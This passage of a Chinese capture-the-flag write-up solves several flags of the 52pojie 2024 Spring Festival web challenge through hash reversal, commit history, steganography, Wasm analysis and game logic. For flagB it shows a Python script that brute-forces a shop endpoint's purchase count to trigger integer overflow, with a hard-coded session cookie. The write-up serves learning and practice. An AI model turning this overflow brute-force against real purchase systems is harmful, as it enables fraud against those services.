!important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">querySelector</span>(<span style="color: rgb(168, 255, 96);">"button"</span>).<span style="color: rgb(255, 255, 182);">addEventListener</span>(<span style="color: rgb(168, 255, 96);">"click"</span>, () =&gt; {<br />  <span style="color: rgb(150, 203, 254);">const</span> t0 = <span style="color: rgb(255, 255, 182);">Date</span>.<span style="color: rgb(255, 255, 182);">now</span>();<br />  <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(255, 115, 253);">1e8</span>; i++) {<br />    <span style="color: rgb(150, 203, 254);">if</span> ((i &amp; <span style="color: rgb(255, 115, 253);">0x1ffff</span>) === <span style="color: rgb(255, 115, 253);">0x1ffff</span>) {<br />      <span style="color: rgb(150, 203, 254);">const</span> progress = i / <span style="color: rgb(255, 115, 253);">1e8</span>;<br />      <span style="color: rgb(150, 203, 254);">const</span> t = <span style="color: rgb(255, 255, 182);">Date</span>.<span style="color: rgb(255, 255, 182);">now</span>() - t0;<br />      <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<br />        <span style="color: rgb(168, 255, 96);">`<span style="color: rgb(218, 239, 163);">${(progress * <span style="color: rgb(255, 115, 253);">100</span>).toFixed(<span style="color: rgb(255, 115, 253);">2</span>)}</span>% <span style="color: rgb(218, 239, 163);">${Math.floor(<br />          t / <span style="color: rgb(255, 115, 253);">1000</span><br />        )}</span>s ETA:<span style="color: rgb(218, 239, 163);">${Math.floor(t / progress / <span style="color: rgb(255, 115, 253);">1000</span>)}</span>s`</span><br />      );<br />    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(255, 255, 182);">MD5</span>(<span style="color: rgb(255, 255, 182);">String</span>(i)) === <span style="color: rgb(168, 255, 96);">"1c450bbafad15ad87c32831fa1a616fc"</span>) {<br />      <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">querySelector</span>(<span style="color: rgb(168, 255, 96);">"#result"</span>).textContent = <span style="color: rgb(168, 255, 96);">`flag6{<span style="color: rgb(218, 239, 163);">${i}</span>}`</span>;<br />      <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />  }<br />});</code></pre><p><span style="color: #000000;">简而言之就是它跑了一个从0到<span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 3.759em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 3.205em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.419em; height: 0px;"><span><span>10</span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span><span><span>8</span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span></span></span><span>−</span><span>1</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>108−1</span></span>的数字字符串i，当该字符串的md5为<code style="font-family: Consolas, Monaco, ;"></code></span><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: #000;">1c450bbafad15ad87c32831fa1a616fc</span><span style="color: #000;"></span></code><span style="color: #000;">时，输出</span><span style="color: #000;"><code style="font-family: Consolas, Monaco, ;">flag6{${i}}</code>，否则在console中定期输出计算进度</span><br /><span style="color: #000000;">（好家伙，暴力破解md5，真有你的）</span><br /><span style="color: #000000;"><br /></span><br /><span style="color: #000000;">直接md5彩虹表反查，发现是今天的日期，绝了......</span><br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=f6d13f13&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKqlE8YTK2mZ3f3QDTGGyJLYtQ4hr6rSicjLjh9WrFDmohnib4siawFzVRQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag6{20240217}</span></p></blockquote><h3>Flag7</h3><p>作者在视频里面留下了一个Github网址，打开发现这个：<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=9a0a5041&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKiaglsV51Sg65ITVDuqNS5Wkk0TkL0PfOOa1xgq0k3bmxE6enZDWcicvw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;">"删除不小心提交的flag内容"</p></blockquote><p>提示够明显了，我们直接点击commit寻找历史提交记录，找到了这个<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5e1a11c2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKlcdRriab0dgAgd1Xib9lRQ3xMSSByibribZxYTTbxialsYGLk0U660hqB2Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag7{Djl9NQ}</span></p></blockquote><h3>Flag8 &amp; FlagB</h3><p>2048小游戏<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ca5b9877&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK5e0LlGpx6M6mlvtzAts6QFia0NUC289IQnklEFl9e5hUWNc6NvAkTVw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>首先肯定是玩咯，轻轻松松通过玩游戏顺利拿到 flag8</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b7f8d712&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK93zQJvCPWVtBZRyia2DcbQ8pEPzhmZFsjIRFpeLTWuZt3xrWgqaKLpA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag8{OaOjIK}</span></p></blockquote><p>接着拿剩下的金币V了作者50（doge）</p><blockquote><p style="margin-bottom: 15px;">竟然真的有人v我50，真的太感动了。作为奖励呢，我就提示你一下吧，关键词是“溢出”。</p></blockquote><p>首先想到的肯定是多买点，然后让它溢出，可惜有可能弄得太猛了，导致溢出后金币数量增加了，作者也想到了这个，购买请求直接被拦截了<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=191e9930&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKRCrNlMZQVblcico4MmCpSCxnhKqzSDHJ3j8903zJU4ZZXNnIDnsUGAQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>猜想是做了检验，即购买后金币数量不能高于现有数量。<br />手算了几个临界值，罢了，完全没用，<br />因为题目没有写明白它后端到底用的啥数据类型，因此放弃思考，直接用request组件爆破</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);"># 导入requests模块</span><br /><span style="color: rgb(150, 203, 254);">import</span> requests<br /><span style="color: rgb(150, 203, 254);">for</span> i <span style="color: rgb(150, 203, 254);">in</span> [<span style="color: rgb(255, 115, 253);">2</span> ** j <span style="color: rgb(150, 203, 254);">for</span> j <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">2</span>,<span style="color: rgb(255, 115, 253);">64</span>)]:<br />    print(i)<br />    <span style="color: rgb(124, 124, 124);"># 请求的url地址</span><br />    url = <span style="color: rgb(168, 255, 96);">'https://2024challenge.52pojie.cn/flagB/buy_item'</span><br />    <span style="color: rgb(124, 124, 124);"># 请求头</span><br />    headers = {<span style="color: rgb(168, 255, 96);">"content-type"</span>:<span style="color: rgb(168, 255, 96);">"application/x-www-form-urlencoded"</span>,<span style="color: rgb(168, 255, 96);">"cookie"</span>:<span style="color: rgb(168, 255, 96);">"Hm_lvt_46d556462595ed05e05f009cdafff31a=1707280828,1707352290,1707440981,1708065094; wzws_sessionid=gmY5MmRiY4AxODMuMTkzLjE1My4yMjCBMTNmOWIzoGXQNBg=; guFOgjwXg5haqETMpDMLPyHfY7sP5sf32rW7l3XtVr+9T+LyBKQhmslLNA==; uid=BTtCuUGDQGSkBsn/UatmT1VT4wNkVf1j4O5UsVxg9yguZA==; game2048_user_data=I1xnNzcQVLZgwF2jXweH+0MFEE3RglZSqpAhElrNkr5VWSjGb885YMYIqMyGAZJGqCFvZ1oCV50LnAJbBvQuPLM0deHxcni4v3dvVKohNEaWNui6WbpPusQ2ff13MWv7wkO1jX/cfa0fZQOJK7UtfQvrUlJD+1GqDCYs7TCYLLEtrObxDt74D2Jswg4ViV9/1o5HHtDI"</span>}<br />    <span style="color: rgb(124, 124, 124);"># payload 为传入的参数</span><br />    payload = {<span style="color: rgb(168, 255, 96);">"shop_item_id"</span>:<span style="color: rgb(255, 115, 253);">5</span>,<span style="color: rgb(168, 255, 96);">"buy_count"</span>:i}<br />    <span style="color: rgb(124, 124, 124);"># json形式，参数用json</span><br />    res = requests.post(url,data=payload,headers=headers)<br />    print(res.text)</code></pre><p>运气还不错，跑到2^62 = 4611686018427387904时返回值为<code style="font-family: SFMono-Regular, Consolas, ;">{"code":0,"msg":"OK"}</code>，也就是说买4611686018427387904个flagB时符合要求<br />（其他的要不返回<code style="font-family: SFMono-Regular, Consolas, ;">{"code":1,"msg":"购买商品之后钱怎么还变多了？不知道出什么 bug 了，暂时先拦一下 ^_^"}</code>，要不返回<code style="font-family: SFMono-Regular, Consolas, ;">{"code":1,"msg":"钱不够"}</code><br />后来尝试发现此时并未扣除任何金币，<em style="color: rgb(102, 102, 102);">猜测此时乘上任何单价都会溢出，溢出后花销值变为0</em></p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0ba534a4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKSpUJ0ZNsqKA3bWk8SgRS46rCs27iby1Gn8ICcma1E73khgS0iboB3GSg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flagB{2a3ec954} 过期时间: 2024-02-17 12:10:00</span></p></blockquote><h3>Flag9</h3><p>之前说到的那一串符号，调节窗口大小，即可看到立体的Flag9<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=cc33939c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKsVD1IfgWzBjJc0X1dVXC2uPbRlw4oLOonj2OxChQKHI2auvkV6rAicw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag9{KHTALK}</span></p></blockquote><h3>Flag10</h3><p>和Flag4是一张图片，图片misc类嘛，首先用binwalk看看是不是有什么不对劲的地方。<br />好像还挺正常的，没有隐藏压缩包也没有藏图<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=884e19e4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKJ9IL6vJQhgx8zKxTU6sibCzQJTlmN7FchknibDiaPdjAWCx3qfjJSEe9Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><span style="font-weight: 700;">小插曲，这边diss一波edge浏览器，打开图片链接他会自动给你跳到它这个“边缘图像查看器”，即使你选择其中的“另存为”功能保存图片，下载到的图片也是被处理过的，隐写数据就丢了！！</span><br />（“强大”？？？）</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ce2ef47c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKC6z1LWiaPQSney4xYtB58tVkBibPnvS8bfXqFNiay4tpvyyEGanWmpS7A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><span style="font-weight: 700;">所以，做这题时 <span style="color: #ff0000;">千 万 不 要 </span>用edge下载图片！！</span><br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6dbb2cc3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKcv1JsDwaZE0RiaHa6ZU0LiaXXZnDMtb696fBCjeWxhON6O0680c9YjZg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>发现这个问题以后，直接用curl命令下载图片<code style="font-family: SFMono-Regular, Consolas, ;">curl -l https://2024challenge.52pojie.cn/flag4_flag10.png -o ./flag4_flag10.png</code></p><p>接下来就简单了，用stegsolve工具中的Analyse-Stereogram Solver（立体视图）工具，设置偏移量为1或2即可看到隐藏的flag10</p><p>上图是curl下载图片（含隐写信息）；下图是edge下载图片（无隐写信息）<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=8a0e241c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKibUvZ5hJVS2VU1dtQDOic68rhWN0GQ4CV73BjwCcOXL5ViaJiaXAj4XktA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=56ec2049&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK2tDAHWXw2ycsmbnof7jS3O91BAibAx4gVicg727De3Mjf3gM5Vh9NnLQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag10{6BxMkW}</span></p></blockquote><h3>Flag11</h3><p>拼图游戏，修改html:root中的css属性<code style="font-family: SFMono-Regular, Consolas, ;">--var1</code>和<code style="font-family: SFMono-Regular, Consolas, ;">--var2</code>，复原图片即可【两个变量的值分别为71和20】<br />（小技巧，使用鼠标滚轮滚动参数，使图片块往聚合方向运动就没啥问题了）<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=af6b8ec6&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKp4KgxQlNWKQmM7ibwCMIpzQfmQQibRYTUANCC5qGIsxI9YCIKDJOVqRg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag11{HPQfVF}</span></p></blockquote><h3>Flag12</h3><p>WebAssembly（Wasm）技术，直接看关键部分</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"> (func $<span style="color: rgb(255, 255, 182);">get_flag12</span> (;<span style="color: rgb(255, 115, 253);">0</span>;) (export <span style="color: rgb(168, 255, 96);">"get_flag12"</span>) (param $var0 <span style="color: rgb(255, 255, 182);">i32</span>) (result <span style="color: rgb(255, 255, 182);">i32</span>)<br />    <span style="color: rgb(255, 255, 182);">i32</span>.<span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 115, 253);">1213159497</span><br />    <span style="color: rgb(255, 255, 182);">i32</span>.<span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 115, 253);">0</span><br />    local.get $var0<br />    <span style="color: rgb(255, 255, 182);">i32</span>.<span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 115, 253);">1103515245</span><br />    <span style="color: rgb(255, 255, 182);">i32</span>.mul<br />    <span style="color: rgb(255, 255, 182);">i32</span>.<span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 115, 253);">1</span><br />    <span style="color: rgb(255, 255, 182);">i32</span>.eq<br />    select<br />  )</code></pre><p>用chatgpt解释一下代码：<br />这段WebAssembly（Wasm）代码定义了一个名为get_flag12的函数，该函数接受一个32位整数作为参数$var0，并返回一个32位整数作为结果。这个函数的作用是检查传入的参数是否与特定值相关联，如果是则返回1，否则返回0。<br />具体而言，代码执行以下步骤：</p><ol><li style="margin-left: 2px;"><p>i32.const 1213159497：将值1213159497（0x483CEEE9）压入堆栈。</p></li><li style="margin-left: 2px;"><p>i32.const 0：将值0压入堆栈。</p></li><li style="margin-left: 2px;"><p>local.get \$var0：将函数参数\$var0的值压入堆栈。</p></li><li style="margin-left: 2px;"><p>i32.const 1103515245：将值1103515245（0x41C64E6D）压入堆栈。</p></li><li style="margin-left: 2px;"><p>i32.mul：将栈顶两个值相乘。</p></li><li style="margin-left: 2px;"><p>i32.const 1：将值1压入堆栈。</p></li><li style="margin-left: 2px;"><p>i32.eq：比较栈顶两个值是否相等，如果相等则将1压入堆栈，否则将0压入堆栈。</p></li><li style="margin-left: 2px;"><p>select：根据栈顶的布尔值选择两个值中的一个放回栈顶。</p></li></ol><p>因此，这段代码的主要目的是将参数$var0与特定的数值进行处理，并根据结果返回1或0。</p><p>又是溢出问题，即1103515245*<code style="font-family: SFMono-Regular, Consolas, ;">输入值</code> = 1，那么这个输入值一定很大（超出上限），<br />这边提到了i32，即32位整型数据，最大值为2^31-1 = 2147483647<br />写个C语言程序跑一下</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;bits/stdc++.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;iostream&gt;</span></span><br /><span style="color: rgb(150, 203, 254);">using</span> <span style="color: rgb(150, 203, 254);">namespace</span> std;<br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>()<br />{<br />    <span style="color: rgb(150, 203, 254);">for</span>(<span style="color: rgb(255, 255, 182);">long</span> j = <span style="color: rgb(255, 115, 253);">0</span>; j&lt;= <span style="color: rgb(255, 115, 253);">4294967295</span>; j++){<br />        <span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">1103515245</span>;<br />        <span style="color: rgb(150, 203, 254);">if</span>(i*j == <span style="color: rgb(255, 115, 253);">1</span>) {<br />            cout&lt;&lt;j&lt;&lt;endl;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><p>嗯？结果跑出来个负数？不管了，填进去。</p><blockquote><p style="margin-bottom: 15px;">-289805467</p></blockquote><p>这也能出答案是我没想到的......看来是满足条件就能出......<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a342e295&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKdkdDRMibcUh4Am0XkJyOiaia4gXynDVsIL6SnIEfseicPjSb7T2HfK5lnA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag12{HOXI}</span></p></blockquote><h3>FlagC</h3><p>好家伙，直接内嵌TF.js跑Yolo目标检测模型了（不过看起来好像是yolov5n，没上v8不是很认可【doge】）......<br />当小游戏直接玩吧，它都直接告诉你那些正确了，调整一下位置即可。<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5f3f3476&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKzx4zMFvqhXxqwTKTlcmG4qBOh38VSUjqk8oaw8kiaANMe5HicrlRJAtQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>我搭出的阵：<br /><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=9ba37440&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKKNOxAAGN5mf6qzPApUr6icHaCJUeC0K0xEQDufSp6JrKLE1PIvsFqTw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>下面来简单看一下这个网页的逻辑：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">'/flagC/verify'</span>, {<br />                        method: <span style="color: rgb(168, 255, 96);">'POST'</span>,<br />                        headers: {<br />                            <span style="color: rgb(168, 255, 96);">'Content-Type'</span>: <span style="color: rgb(168, 255, 96);">'application/json'</span>,<br />                        },<br />                        body: <span style="color: rgb(255, 255, 182);">JSON</span>.<span style="color: rgb(255, 255, 182);">stringify</span>({<br />                            boxes,<br />                            scores,<br />                            classes,<br />                        }),<br />                        credentials: <span style="color: rgb(168, 255, 96);">"include"</span>,<br />                    }).<span style="color: rgb(255, 255, 182);">then</span>((res) =&gt; res.<span style="color: rgb(255, 255, 182);">json</span>()).<span style="color: rgb(255, 255, 182);">then</span>((res) =&gt; {<br />                        <span style="color: rgb(150, 203, 254);">const</span> {hint, labels, colors} = res;<br />                        <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">querySelector</span>(<span style="color: rgb(168, 255, 96);">'#result'</span>).textContent = hint; <span style="color: rgb(124, 124, 124);">// 错误时显示提示，正确时显示 flag</span><br />                    })</code></pre><p>简而言之就是调用TF.js(Tensorflow，Google开发的一款深度学习框架)加载yolo目标检测模型，对上传的图片执行本地目标检测<br />然后将检测结果（boxes-&gt;【目标框】，scores【置信度】，classes【分类标签】）以POST形式传递至后端，接受后端返回的提示，并在图中框出来</p><p>emmm，这个玩玩就好了，修改也没啥意思，因为判断逻辑在后端，程序能帮你做的也只能是根据提示不断修改，意义不大（doge）</p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flagC{ce92f978} 过期时间: 2024-02-18 10:10:00</span></p></blockquote><p style="margin-bottom: 0px; margin-top: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1888883-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Fri, 15 Mar 2024 17:26:51 +0800</pubDate>
</item>
<item>
<title>十六周年开放注册四小时共注册46677人，没有激活的同学请尽快激活啦，发帖前请认真阅读注册须知和总版规，防止违规封号注销。

刚加入的同学请经常登录并保持活跃（注意：签到不算活跃，只有发帖或回帖才算，这句话很重要），参与到论坛交流中来，对于给予帮助你的人加热心和论坛币，做一个热心受欢迎的人。</title>
